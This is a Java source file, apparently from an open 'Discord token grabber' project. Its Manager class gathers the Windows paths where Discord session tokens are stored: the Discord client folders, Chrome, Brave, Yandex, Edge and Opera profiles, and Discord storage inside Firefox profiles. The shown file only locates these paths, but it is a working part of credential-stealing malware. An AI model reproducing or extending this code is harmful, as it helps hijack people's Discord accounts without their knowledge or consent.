package com.github.dedinc.discordtokengrabber.utils;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class Manager {

    public final String ROAMING = System.getenv("APPDATA");
    public final String LOCAL = System.getenv("LOCALAPPDATA");
    public ArrayList<String> paths = new ArrayList<String>();

    public ArrayList<String> getPaths() {
        addPath(Paths.get(ROAMING, "discord").toString());
        addPath(Paths.get(ROAMING, "discordcanary").toString());
        addPath(Paths.get(ROAMING, "discordptb").toString());
        addPath(Paths.get(LOCAL, "Google", "Chrome", "User Data", "Default").toString());
        addPath(Paths.get(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default").toString());
        addPath(Paths.get(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default").toString());
        addPath(Paths.get(LOCAL, "Microsoft", "Edge", "User Data", "Default").toString());
        addPath(Paths.get(ROAMING, "Opera Software", "Opera Stable").toString());
        addPath(Paths.get(ROAMING, "Opera Software", "Opera GX").toString());
        parseFirefoxProfiles(Paths.get(ROAMING, "Mozilla", "Firefox").toString());
        return paths;
    }

    public void addPath(String path) {
        if (new File(path).exists()) {
            paths.add(path);
        }
    }

    public void parseFirefoxProfiles(String path) {
        if (new File(path).exists()) {
            try {
                Files.list(Paths.get(path, "Profiles"))
                        .limit(100)
                        .forEach(folder -> {
                            if (folder.toFile().getName().endsWith("release")) {
                                try {
                                    Files.list(Paths.get(folder.toFile().getAbsolutePath(), "storage", "default"))
                                            .limit(100)
                                            .forEach(file -> {
                                                if (file.toFile().getName().contains("discord")) {
                                                    addPath(Paths.get(file.toFile().getAbsolutePath(), "ls").toString());
                                                }
                                            });
                                } catch (Exception e) {}
                            }
                        });
            } catch (Exception e) {}
        }
    }
}
